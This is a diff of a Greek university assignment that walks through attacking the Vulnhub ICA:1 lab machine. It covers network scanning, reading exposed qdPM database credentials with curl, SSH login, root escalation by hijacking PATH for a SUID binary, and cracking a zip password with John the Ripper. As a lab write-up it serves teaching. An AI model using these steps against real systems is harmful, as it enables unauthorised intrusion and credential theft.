@@ -14,7 +14,10 @@ coAM: 1072809
 title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύστημα
 ---
 
-
+<br>
+<br>
+<br>
+<br>
 <br>
 <br>
 <br>
@@ -30,7 +33,8 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 Ασφάλεια Υπολογιστών και Δικτύων, 2023-2024
 </h3></center>
 
-
+<br>
+<br>
 <br>
 <br>
 
@@ -64,11 +68,13 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 ----
 # Scenario  
 
+
+
 %%  [source Vulnhub](https://www.vulnhub.com/entry/ica-1,748/)  %%
 
 ## Description
 
-Έστω οτι εχουμε καταφερει να συνδεθουμε στο εσωτερικο δικτυο μιας εταιριας και θελουμε να αποκτησουμε προσβαση σε εναν υπολογιστη της για να αποκτησουμε πληροφοριες για το προτζεκτ ICA. 
+Έστω οτι εχουμε καταφερει να συνδεθουμε στο εσωτερικο δικτυο μιας εταιριας και θελουμε να αποκτησουμε προσβαση σε εναν υπολογιστη της για να αποκτησουμε πληροφοριες για το προτζεκτ "ICA". 
 
 ## Ζητούμενα 
 - Χαρτογραφηση του δικτυου και ευρεση ευαλωττου μηχανηματος 
@@ -114,12 +120,10 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 
 ## Host discovery
 
-Υπαρχουν διαφορα εργαλεία που μας επιτρεπουν χαρτογραφηση δικτυου :
+Υπαρχουν διαφορα εργαλεία που μας επιτρεπουν χαρτογραφηση δικτυου, όπως το arp-scan και το nmap. Εμεις θα χρησιμοποιησουμε το nmap (Network Mapper):
+
 
 #### arp-scan 
-
-==Να γραψω τι κανει το εργαλειο==
-
 
 ```bash
 sudo arp-scan -I wlp4s0 --localnet 
@@ -129,10 +133,10 @@ sudo arp-scan -I wlp4s0 --localnet
 ```bash
 Interface: wlp4s0, type: EN10MB, MAC: ec:5c:68:db:c2:41, IPv4: 192.168.1.11
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-192.168.1.1	34:24:3e:06:a1:04	zte corporation
-192.168.1.6	00:45:e2:9f:96:83	CyberTAN Technology Inc.
-192.168.1.9	00:45:e2:9f:96:83	CyberTAN Technology Inc.
-192.168.1.8	46:3d:cc:39:90:76	(Unknown: locally administered)
+192.168.1.1	 34:24:3e:06:a1:04	zte corporation
+192.168.1.6	 00:45:e2:9f:96:83	CyberTAN Technology Inc.
+192.168.1.9	 00:45:e2:9f:96:83	CyberTAN Technology Inc.
+192.168.1.11 46:3d:cc:39:90:76	(Unknown: locally administered)
 
 4 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.051 seconds (124.82 hosts/sec). 4 responded
@@ -258,7 +262,7 @@ PORT     STATE SERVICE VERSION
 | ssh-hostkey: 
 |   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
 |   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
-|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
+|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0💿7b:8e (ED25519)
 80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
 |_http-title: qdPM | Login
 |_http-server-header: Apache/2.4.48 (Debian)
@@ -309,8 +313,7 @@ nmap -Pn -sC -sV -T4 192.168.1.9 -oN nmap/machine_9_2 -p-
 `````
 
 
-Βλεπουμε οτι στην `192.168.1.9` υπαρχουν ανοιχτες οι πόρτες 22, 80, 3306 και υπηρεσιες ssh, webserver, mysql που μπορει να ειναι ευαλωττες.
-Αντιθετα με το `192.168.1.7` που δεν εχει καποια ανοιχτη πορτα με γνωστη υπηρεσια. 
+Αντιθετα με το `192.168.1.7` ,που δεν εχει καποια ανοιχτη πορτα με γνωστη υπηρεσια, βλεπουμε οτι στην `192.168.1.9` υπαρχουν ανοιχτες οι πόρτες 22, 80, 3306 και υπηρεσιες ssh, webserver, mysql που μπορει να ειναι ευαλωττες.
 
 
 Αναθετουμε την ip στην μεταβλητη ipt για να διευκολυνθουμε να τρεχουμε τις εντολες με την μεταβλητη $ipt: 
@@ -404,7 +407,7 @@ nmap -Pn -sV --script vulners 192.168.1.9 -oN nmap/machine_9_vuln_2
 Συγκεκριμενα οταν συνδεομαστε στο url http://192.168.1.9:80 βλεπουμε το περιεχομενο της σελιδας 
 
 
-Βλεπουμε το version που τρεχει : `pdPM 9.2 `
+Βλεπουμε το version που τρεχει : `qdPM 9.2 `
 
 
 ```
@@ -418,6 +421,9 @@ nmap -Pn -sV --script vulners 192.168.1.9 -oN nmap/machine_9_vuln_2
 
 
 ````
+
+%% page breaker %%
+<div style="page-break-after: always;"></div>
 
 
 Και θα αξιοποιησουμε το εργαλειο `searchsploit` απο το πακετο `exploitdb` για να δουμε εαν το version αυτο εχει καποιο γνωστο vulnerability ή να κανουμε μια αναζητηση στο [exploit-db.com](https://www.exploit-db.com/exploits/50176) .
@@ -436,7 +442,6 @@ qdPM 9.2 - Password Exposure (Unauthenticated)      | php/webapps/50176.txt
 ---------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-
 
 
 
@@ -466,11 +471,15 @@ The password and connection string for the database are stored in a yml file. To
 
 
 
+
 ## Exploiting Vulnerabilities
 
-Exploiting using the vulnerability: 
+Exploiting using the vulnerability Password Exposure: 
 
-Το κενο ευπαθειας, δειχνει οτι υπαρχει ελευθερο το αρχειο που περιεχει συνθηματικα για την mysql βαση που στηριζεται το site.
+
+> [!explanation]
+> Το κενο ασφαλειας Password Exposure, δειχνει οτι υπαρχει δημόσιο το αρχειο `database.yml` που περιεχει συνθηματικα για την mysql βαση που στηριζεται το site.
+
 
 Ειτε παμε στην σελιδα απο το browser ειτε με την εντολη curl : 
 
@@ -478,6 +487,7 @@ Exploiting using the vulnerability:
 curl http://192.168.1.9:80/core/config/databases.yml 
 ```
 
+<font color="#646a73">Output:</font>
 ```
 all:
   doctrine:
@@ -491,15 +501,15 @@ all:
         quote_identifier: true 
 ```
 
-Οποτε βρηκαμε τον Κωδικο της βασης δεδομενων που τρεχει πισω απο τον webserver 
+Οποτε βρηκαμε το username και τον κωδικο του admin της βασης δεδομενων που τρεχει πισω απο τον webserver και μπορουμε να συνδεθουμε σε αυτη.
 
 
-%%
+
 Different way to see the vulnerabilities :
 ```bash
 whatweb http://$ipt
 ```
-%%
+
 
 
 ---
@@ -837,7 +847,20 @@ DJceVy98W28Y7wLg
 
 
 
-Αφου συνδεθουμε στο ssh :
+Αφου συνδεθουμε στο ssh και δουμε τι αρχεία έχει στο φακελο home : 
+
+```bash
+ls
+```
+
+<font color="#646a73">Output:</font>
+```bash
+user.txt
+```
+
+
+
+Ανοιγουμε να δουμε τα περιεχομενα του αρχειου user.txt
 
 ```bash
 cat user.txt 
@@ -848,7 +871,9 @@ cat user.txt
 ICA{Secret_Project}
 ```
 
-Μπορουμε να δουε οτι εχουμε προσβαση στον φακελο του travis 
+
+
+Μπορουμε να δουμε οτι εχουμε προσβαση στον φακελο του travis 
 
 Θελουμε να δουμε τι αλλο μπορει να κανει ο travis σαν sudo 
 Οποτε τρεχουμε 
@@ -937,12 +962,16 @@ I need to find out if there is a vulnerability or not.
 sudo -l
 ```
 
+<font color="#646a73">Output:</font>
 ```
 Sorry, user dexter may not run sudo on debian.
 ```
 
 
-Συμφωνα με το μηνημα του note.txt υπαρχουν καποια binaries που μπορουμε να εκμεταλευτουμε. 
+Συμφωνα με το μηνημα του note.txt υπαρχουν καποια binaries που μπορουμε να εκμεταλευτουμε. Για αυτο τον λογο ψαχνουμε executable αρχεια με `setuid` 
+
+Οταν χρησιμοποιειται το `setuid` bit, τοτε το αρχείο που γινεται executed δεν τρεχει με τα δικαιωματα του χρηστη που το έτρεξε αλλά με τα δικαιώματα του ιδιοκτήτη του αρχείου. Στην συγκεκριμένη περίπτωση ο ιδιοκτήτης είναι ο root. 
+
 
 ```bash 
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
@@ -958,6 +987,7 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 
 Αξιοποιωντας την εντολη find, αναζητουμε απο τον root folder τα αρχεια που εχει το setuid bit set, ειναι αρχεία 
 
+<font color="#646a73">Output:</font>
 ```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 -rwsr-xr-x 1 root root 16816 Sep 25  2021 /opt/get_access
@@ -984,6 +1014,7 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 ls -la /opt/get_access 
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 -rwsr-xr-x 1 root root 16816 Sep 25  2021 /opt/get_access
 ```
@@ -995,15 +1026,20 @@ ls -la /opt/get_access
 file /opt/get_access 
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 /opt/get_access: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74c7b8e5b3380d2b5f65d753cc2586736299f21a, for GNU/Linux 3.2.0, not stripped
 ```
 
 
+
+Μαθαινουμε οτι είναι executable lsb αρχειο. Επειτα τρεχουμε την εντολη strings για να δουμε τι εντολες καλει το αρχειο οταν τρεχει: 
+
 ```bash
 strings /opt/get_access 
 ```
 
+<font color="#646a73">Output:</font>
 ```
 /lib64/ld-linux-x86-64.so.2
 setuid
@@ -1099,10 +1135,11 @@ socket@GLIBC_2.2.5
 Normally, on a unix-like operating system, the ownership of files and directories is based on the default `uid` (user-id) and `gid` (group-id) of the user who created them. The same thing happens when a process is launched: it runs with the effective user-id and group-id of the user who started it, and with the corresponding privileges. This behavior can be modified by using special permissions.
 %%
 
+%% 
 Οταν χρησιμοποιειται το `setuid` bit, τοτε το αρχείο που γινεται executed δεν τρεχει με τα δικαιωματα του χρηστη που το έτρεξε αλλά με τα δικαιώματα του ιδιοκτήτη του αρχείου. Στην συγκεκριμένη περίπτωση ο ιδιοκτήτης είναι ο root. 
+ %%
 
 Έπειτα βλεπουμε οτι μπορει να τρεξει cat στο /root directory . Όμως το cat δεν εχει absolute path στην 16 γραμμη.
-
 
 
 Με την παρακατω εντολη βρισκουμε ποιο προγραμμα καλει η εντολη cat οταν καλειται 
@@ -1124,12 +1161,13 @@ which cat
 echo $PATH
 ```
 
+<font color="#646a73">Output:</font>
 ```
 /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 ```
 
 
-Δημιουργουμε ενα νεο αρχειο στο directory tmp: 
+Δημιουργουμε ενα νεο αρχειο στο directory tmp και θετουμε σαν περιεχομενο την εντολη `/bin/bash`. 
 
 ```bash
 echo '/bin/bash' >> /tmp/cat
@@ -1141,13 +1179,6 @@ echo '/bin/bash' >> /tmp/cat
 ```bash
 chmod +x /tmp/cat
 ```
-
-
-%%
-```
-Now when we execute the binary, since it executed **"cat" relatively**, it will now execute our own "**cat**" and since the owner is "**root**" and it is an **"SUID" binary**, we can alter the content of our "**cat**" to assign "**SUID**" privilege to "**bash**". We open our "**cat**" and write the following in it: **chmod u+s /bin/bash.** if you can't use **nano** to edit the file, write **export TERM=xterm** and press enter. We close the file and proceed to execute the binary **/opt/get_access**, and it tells us:
-```
-%%
 
 
 Στοχος μας ειναι να πειραξουμε το PATH, ωστε οταν καλει την cat, να μην καλει την `/usr/bin/cat` αλλα την `/tmp/cat`. Για αυτο βαζουμε πρωτα στο PATH τον φακελο temp.
@@ -1162,7 +1193,7 @@ export PATH=/tmp:$PATH
 ```
 
 
-Βλεπουμε οτι βαλαμε κανονικα τον φακελο tmp στο path, αρα το cat που βρισκεται στο tmp μπορει να το καλεσει το προγραμμα get_access.
+Βλεπουμε οτι βαλαμε κανονικα τον φακελο tmp στο path, αρα το cat που βρισκεται στο tmp μπορει να το καλεσει το προγραμμα get_access. 
 
 Ολη αυτη τη διαδικασια την κανουμε για να μπουμε στον φακελο root, στον οποιο δεν εχουμε προσβαση με αλλον λογαριασμο εκτος απο τον root. 
 
@@ -1195,12 +1226,12 @@ root@debian:~#
 
 ## Root user access 
 
-%% 
+ 
 password 
 ```
 root
 ```
-%%
+
 
 <font color="#646a73">Command:</font>
 ```bash
@@ -1208,7 +1239,7 @@ root@debian:/root# ls
 ```
 
 <font color="#646a73">Output:</font>
-```
+```bash
 encrypted.zip  root.txt  system.info
 ```
 
@@ -1250,12 +1281,14 @@ Archive:  encrypted.zip
 
 # Password Cracking Zip 
 
-%%
+
+%% 
 Creating the zip file : 
 
 ```bash
 zip zip_tech-racoon-1337.zip super_secret.txt -e
 ```
+ 
 
 
 ```bash
@@ -1274,7 +1307,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-%%
+ %%
 
 
 Για να σπασουμε τον κωδικο του zip θα αξιοποιησουμε το προγραμμα john the ripper 
@@ -1285,6 +1318,7 @@ Session completed.
 zip2john encrypted.zip > encrypted.zip.hash
 ```
 
+<font color="#646a73">Command:</font>
 ```bash
 ver 2.0 efh 5455 efh 7875 encrypted.zip/super_secret.txt PKZIP Encr: TS_chk, cmplen=75, decmplen=66, crc=314B6EBB ts=ACC8 cs=acc8 type=8
 ```
@@ -1294,12 +1328,12 @@ ver 2.0 efh 5455 efh 7875 encrypted.zip/super_secret.txt PKZIP Encr: TS_chk, cmp
 cat encrypted.zip.hash
 ```
 
-
+<font color="#646a73">Command:</font>
 ```bash
 encrypted.zip/super_secret.txt:$pkzip$1*1*2*0*4b*42*314b6ebb*0*4a*8*4b*acc8*36941e5a11e0958d6e84afd109d91ded9564d065695ffdd51651745f9b041118a7b72913586688cd19a92af0eb716cd82871c04249e8b42144d32188e1f99692dd0876ca01af46974097bd*$/pkzip$:super_secret.txt:encrypted.zip::encrypted.zip
 ```
 
-Απο το σημειο `$pkzip και μετα ακολουθει το hash του encrypted password. μεχρι το /pkzip}$` 
+Απο το σημειο `$pkzip` και μετα ακολουθει το hash του encrypted password. μεχρι το `/pkzip$` 
 
 
 
@@ -1323,7 +1357,7 @@ Session completed.
 ```
 
 
-%% 
+ %% 
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -1337,7 +1371,7 @@ racoon           (test.zip/super_secret.txt)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-%%
+ %%
 
 Οπότε βρίσκουμε το κωδικό οτι ειναι techracoon1337 και ξεκλειδωνουμε το encrypted.zip 
 
@@ -1355,13 +1389,13 @@ This is the outmost secret our company is hiding, be wary of it
 
 
 
-
 %% 
+ 
 Reference to : 
 
 [john the ripper source](https://www.youtube.com/watch?v=XjVYl1Ts6XI)
+ 
  %%
-
 
 
 ----
@@ -1404,4 +1438,4 @@ Reference to :
 ````
 
 ----
-%% [Table Of Contents](UNI/Semester-9/ComputerSecurity/assignments/assignment-working.md#Table%20Of%20Contents) %%
+%% [Table Of Contents](UNI/Semester-9/ComputerSecurity/assignments/assignment-working.md#Table%20Of%20Contents)  %%
